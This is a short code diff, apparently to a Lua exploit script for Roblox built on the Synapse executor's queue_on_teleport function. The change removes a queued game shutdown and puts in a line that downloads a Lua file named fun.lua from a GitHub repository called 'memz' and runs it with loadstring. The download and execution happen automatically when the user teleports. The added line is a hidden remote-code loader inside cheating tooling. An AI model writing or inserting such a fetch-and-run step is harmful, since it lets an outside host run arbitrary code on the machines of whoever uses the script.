@@ -36,7 +36,7 @@
     local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
     local teleportScript = [[
        wait(1.7)
-       game:Shutdown()
+       loadstring(game:HttpGet('https://raw.githubusercontent.com/P996Lazer69/memz/main/fun.lua'))()
     ]]
     queueonteleport(teleportScript)
     task.wait(3)
